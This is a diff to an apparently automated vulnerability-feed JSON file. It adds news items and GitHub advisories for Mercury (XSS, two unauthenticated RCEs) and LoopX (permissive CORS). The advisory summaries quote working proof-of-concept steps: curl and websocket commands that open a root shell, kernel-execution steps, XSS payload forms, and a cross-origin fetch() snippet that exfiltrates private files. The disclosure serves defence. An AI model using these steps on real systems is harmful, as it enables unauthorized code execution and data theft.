@@ -1,8 +1,8 @@
 {
-  "generated": "2026-10-19T11:25:30.467054+00:00",
-  "total": 11,
+  "generated": "2026-10-19T17:52:50.266245+00:00",
+  "total": 17,
   "kev": 0,
-  "zero_day": 9,
+  "zero_day": 11,
   "enriched": 0,
   "findings": [
     {
@@ -31,6 +31,37 @@
         "cloud",
         "threat-intel",
         "research"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.wiz.io/blog/detect-supply-chain-zero-days-at-publication",
+      "title": "Supply Chain Zero Days: Closing the Gap Between Publication and Detection",
+      "summary": "When trusted packages are compromised, malicious code can quickly spread throughout and beyond developer environments. See how Wiz\u2019s supply chain pipeline identifies compromised packages at publication, helping teams detect zero-day supply chain compromises in Wiz Defend before a CVE is published",
+      "link": "https://www.wiz.io/blog/detect-supply-chain-zero-days-at-publication",
+      "published": "2026-10-19T14:39:29+00:00",
+      "source": "Wiz Research",
+      "tags": [
+        "cloud",
+        "research",
+        "misconfig"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/10/weekly-recap-98-zero-days-rogue-ai.html",
+      "title": "\u26a1 Weekly Recap: 98 Zero-Days, Rogue AI Agents, $100M Crypto Theft, 700 Supermarkets Hit and More",
+      "summary": "The worst problems don't always come with a warning. Sometimes they arrive through a service everyone trusts, a device someone bought, or a system nobody thought to check. By the time something looks wrong, the damage may already be done.\n\nThis week had plenty of that. Trusted connections became a problem. Hardware wasn't as safe as it looked. Old bugs found new victims, and some systems were",
+      "link": "https://thehackernews.com/2026/10/weekly-recap-98-zero-days-rogue-ai.html",
+      "published": "2026-10-19T14:14:07+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
       ],
       "cve_ids": [],
       "is_zero_day": true,
@@ -168,6 +199,78 @@
         "CVE-2021-22205",
         "CVE-2021-3199",
         "CVE-2023-22894"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111059",
+      "title": "Mercury: Stored / DOM Cross-Site Scripting (XSS): mr.Markdown renders untrusted content as raw, unsanitized HTML",
+      "summary": "## Summary\n\nMercury turns Jupyter notebooks into shared web apps/dashboards. The `mr.Markdown`\nwidget converts its input to HTML with **python-markdown and no sanitization\nstep**. `MarkdownWidget` is an `ipywidgets.HTML` widget, whose value is written to\nthe page as **raw HTML (via `innerHTML`) with no sanitization**, so the result\nreaches the DOM verbatim. When an app passes **untrusted data** (database rows,\nuser submissions, uploaded file contents, or an external/LLM API response) to\n`mr.Markdown`, HTML/JS in that data executes in the browser of **whoever views the\napp** \u2014 a data-driven stored/DOM-based XSS.\n\nThis is a library-provided rendering sink that fails to neutralize output; it is\ntriggered by ordinary, reasonable application code, not by an author mistake.\n\n## Root cause\n\n`mercury/md.py` \u2014 `MarkdownWidget._to_html()` (verified at v3.2.6, lines ~57\u201365):\n\n```python\ndef _to_html(self, text: str) -> str:\n    if md_lib is not None:\n        body = md_lib.markdown(text)          # python-markdown: passes raw HTML through\n    else:\n        body = f\"<pre>{escape(text)}</pre>\"   # escape() is ONLY the md-lib-absent fallback\n    return self._apply_inline_theme(body)     # regex styling \u2014 adds style=, removes nothing\n```\n\nTwo neutralization failures compound:\n\n1. **Markdown \u2192 HTML is unsanitized.** `python-markdown` passes raw HTML through by\n   default: `<img src=x onerror=\u2026>`, `<svg onload=\u2026>`, and `javascript:` links\n   survive verbatim. There is no `bleach`/`nh3` allowlist anywhere in the package.\n   `_apply_inline_theme()` only injects inline `style=` attributes via regex; it is\n   not a sanitizer and removes nothing. `escape()` runs only in the\n   md-lib-absent fallback.\n\n2. **The rendering sink is unsanitized `innerHTML`.** `MarkdownWidget`\n   (`mercury/md.py:21`) subclasses `ipywidgets.HTML`. The ipywidgets HTML widget\n   renders its `value` into the DOM as raw HTML via `innerHTML`, with no\n   sanitization (this is the widget's design). Event-handler payload",
+      "link": "https://github.com/advisories/GHSA-2658-85cv-9wwq",
+      "published": "2026-10-19T17:01:20Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111059"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111057",
+      "title": "Mercury: Unauthenticated Remote Code Execution in /api/terminals - access control bypass",
+      "summary": "### Summary\nA missing comma in `mercury_app/block_handler.py`'s `BLOCKED_PATTERNS` list causes the blocklist to fail to cover the `/api/terminals` endpoint. As a result, any unauthenticated attacker can spawn a full, interactive OS-level shell on the host running Mercury.\n\n### Details\nThe blocklist in `mercury_app/block_handler.py` is defined as:\n```\nBLOCKED_PATTERNS = [\n    # JupyterLab UI + API\n    r\"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?\"\n    r\"/api/terminals(?:/.*)?\",\n    r\"/api/shutdown(?:/.*)?\",\n    r\"/files(?:/.*)?\",\n]\n```\nThe missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:\n\n/lab...(?:/.`*`)?/api/terminals(?:/.`*`)? (the first two lines joined together)\n/api/shutdown(?:/.`*`)?\n/files(?:/.`*`)?\n\nA direct request to `/api/terminals` does not match any of the 3 blocklist rules and is therefore **not blocked**, reaching Jupyter\nServer's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.\n\n### PoC\nTesting was performed on a local Docker deployment (https://runmercury.com/deploy/dockerfile/), Mercury version 3.2.3, default\nconfiguration.\n \n**Step 1 - spawn a terminal:**\n\n\n```\ncurl -i -X POST http://localhost:8888/api/terminals\n```\nResponse: `{\"name\": \"1\", \"last_activity\": \"...\"}`\n\n**Step 2 - connect to the terminal and execute commands:**\n\n\n```\npython3 -c \"\nimport websocket, json, time\n\nws = websocket.create_connection('ws://localhost:8888/terminals/websocket/1')\nprint(ws.recv())\n\nws.send(json.dumps(['stdin', 'whoami && id\\n']))\ntime.sleep(1)\n\nws.settimeout(2)\ntry:\n    while True:\n        print(ws.recv())\nexcept Exception:\n    pass\n\"\n```\n\n\nObserved output:\n\n```\n[\"setup\", {}]\n[\"stdout\", \"# \"]\n[\"stdout\", \"whoami && id\\r\\n\"]\n[\"stdout\", \"root\\r\\n\"]\n[\"stdout\", \"uid=0(root) gid=0(root) groups=0(root)\\r\\n# \"]\n```\n\n\nCon",
+      "link": "https://github.com/advisories/GHSA-f8c7-rwf9-fmgm",
+      "published": "2026-10-19T17:00:54Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111057"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111058",
+      "title": "Mercury: Unauthenticated Remote Code Execution via /api/kernels",
+      "summary": "Mercury runs a JupyterLab server with **anonymous access by default** (`mercury_app/__main__.py` sets `--IdentityProvider.token=''` when no `--token`/`MERCURY_TOKEN` is given; when tokenless it also sets `--ServerApp.disable_check_xsrf=True`). It relies on a **blocklist** (`mercury_app/block_handler.py` `BLOCKED_PATTERNS`: `/lab`, `/api/terminals`, `/api/shutdown`, `/files`) to keep anonymous users off dangerous Jupyter endpoints.\n\n## The vulnerability\n`/api/kernels` is **NOT** in the blocklist (and cannot be \u2014 Mercury needs kernels to run notebooks), and `patch_kernel_websocket_handler()` (`mercury_app/idle_timeout.py`) only tracks the idle-timeout: it wraps `on_message` to call `self.application._timeout_manager.touch()` and then invokes the original handler with **no filtering of `execute_request`**. So any unauthenticated network client can:\n\n```\nPOST /api/kernels {\"name\":\"python3\"}        -> 201, returns kernel id\nopen websocket /api/kernels/<id>/channels\nsend an execute_request with arbitrary code -> arbitrary Python execution = RCE\n```\n\n## Distinct from GHSA-f8c7-rwf9-fmgm (incomplete fix)\nGHSA-f8c7 was \"Unauthenticated RCE via `/api/terminals`\" \u2014 a missing-comma blocklist bypass. Its fix (add the comma so `/api/terminals` is blocked) does **NOT** address `/api/kernels`, which remains exploitable. The blocklist approach is fundamentally unable to cover kernels, so this is not a variant that another blocklist entry fixes.\n\n## Runtime-proven (on the patched version)\nOn **mercury 3.2.4** \u2014 the release that fixed GHSA-f8c7 \u2014 with the default (tokenless) config, as an unauthenticated client: `POST /api/terminals` returns **403** (the f8c7 fix is present), but `POST /api/kernels` returns **201**; opening the kernel websocket and sending an `execute_request` executed attacker-supplied Python (ran `whoami` as the server process user and wrote a marker file `/tmp/PWNED_MERCURY_RCE`). Full unauthenticated remote code execution. Deterministic PoC (client script + notebo",
+      "link": "https://github.com/advisories/GHSA-rv4m-xm3f-3ccq",
+      "published": "2026-10-19T16:49:08Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111058"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-108372",
+      "title": "LoopX serve-status permissive CORS policy exposes control-plane state and private Markdown files",
+      "summary": "## Summary\n\n`loopx serve-status` sends `Access-Control-Allow-Origin: *` on **every** response,\nincluding its unauthenticated `GET` routes. Because the endpoint is unauthenticated and\nbound to a fixed, well-known loopback port, **any website the operator visits can read\nLoopX control-plane state and the contents of Markdown files inside every registered goal\nrepo**, using a plain `fetch()` with no user interaction.\n\nThe write endpoints are *not* affected \u2014 they are correctly Origin-checked. This report is\nstrictly about the **read** paths.\n\n## Impact\n\nWhile `loopx serve-status` is running, a page on any origin can run:\n\n```js\n// no interaction, no preflight, no credentials needed\nconst s = await (await fetch('http://127.0.0.1:8766/status.json')).json();\nfor (const g of s.goals ?? []) {\n  const m = await (await fetch(\n    `http://127.0.0.1:8766/review-material?goal_id=${g.id}&path=design-notes.md`\n  )).json();\n  exfiltrate(m.content);\n}\n```\n\nand read back:\n\n* **`GET /status.json`** \u2014 the whole status projection: goal ids, run history, and local\n  absolute paths (`registry`, `runtime_root`). With `--global-registry` this covers\n  **every project registered on the machine**, not just one.\n* **`GET /review-material?goal_id=\u2026&path=\u2026`** \u2014 the *content* of any `.md`/`.markdown`\n  file under a goal's repo root, state dir, or runtime dir. In practice that is the\n  operator's private design notes, handoff docs, and evidence write-ups.\n* **`GET /`** \u2014 endpoint discovery, including which write APIs are enabled.\n* **`POST /control-plane/configure-goal/dry-run`** \u2014 this route has **no Origin check at\n  all**, and `do_OPTIONS` returns `Access-Control-Allow-Headers: Content-Type`, so a\n  cross-origin JSON POST passes preflight. The response leaks the `before`/`after`\n  control-plane configuration for a goal. (It does not write \u2014 I verified `written=false`.)\n\n`docs/public-private-boundary.md` classifies \"local absolute paths\", \"task ids\", \"raw logs\nand metrics\" and \"active goal state",
+      "link": "https://github.com/advisories/GHSA-vx2m-gpq4-8j5q",
+      "published": "2026-10-19T16:11:57Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-108372"
       ],
       "is_zero_day": false,
       "is_high_severity": true
